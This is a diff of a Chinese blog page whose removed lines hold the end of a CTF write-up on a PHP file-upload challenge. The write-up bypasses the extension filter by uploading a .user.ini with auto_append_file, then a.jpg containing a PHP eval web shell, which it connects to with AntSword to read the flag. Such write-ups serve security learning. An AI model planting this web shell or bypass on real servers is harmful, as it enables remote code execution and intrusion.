&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>pathinfo(“&#x2F;testweb&#x2F;test.txt”) ：以数组的形式返回文件路径的信息，包括：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [dirname] =&gt; /testweb</span><br><span class="line">    [basename] =&gt; test.txt</span><br><span class="line">    [extension] =&gt; txt</span><br><span class="line">    [filename] =&gt; test</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>代码审计可知：程序要求上传文件大小不能超过24字节，文件名长度不得超过9，扩展名长度不得大于3，扩展名和文件名不能包含php，不能大小写绕过。</p>
-<p>根据要求，可以上传.user.ini绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要求：fastCGI</span><br><span class="line">auto_prepend_file=a.jpg //在页面顶部加载文件</span><br><span class="line">auto_append_file=a.jpg //在页面底部加载文件</span><br></pre></td></tr></table></figure>
-
-<p>先上传.user.ini，文件内容是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=a.jpg</span><br></pre></td></tr></table></figure>
-
-<p>再上传a.jpg，文件内容是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure>
-
-<p>最后用蚁剑连接，成功后发现没有读目录的权限，使用虚拟终端尝试执行命令，使用ls发现有一个903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php文件，cat此文件得到flag</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1185,7 +1135,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">50</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1229,7 +1179,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共31.3k字</span>
+  <span class="post-count">博客全站共32.2k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
